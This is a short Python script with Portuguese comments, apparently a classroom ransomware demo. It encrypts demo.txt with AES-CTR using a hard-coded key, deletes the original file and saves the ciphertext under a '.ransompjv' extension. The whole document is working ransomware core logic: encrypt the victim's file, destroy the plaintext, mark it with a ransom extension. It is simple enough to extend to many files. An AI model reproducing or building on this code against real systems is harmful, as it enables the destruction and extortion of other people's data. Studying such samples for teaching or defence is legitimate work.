import os
import pyaes

# Chave de criptografia
key = b"ransomwareprofjv"
aes = pyaes.AESModeOfOperationCTR(key)

# Abrir, ler e criptografar o arquivo
with open("demo.txt", "rb") as file:
    crypto_data = aes.encrypt(file.read())

# Remover o arquivo original
os.remove("demo.txt")

# Salvar o arquivo criptografado
with open("demo.txt.ransompjv", "wb") as new_file:
    new_file.write(crypto_data)
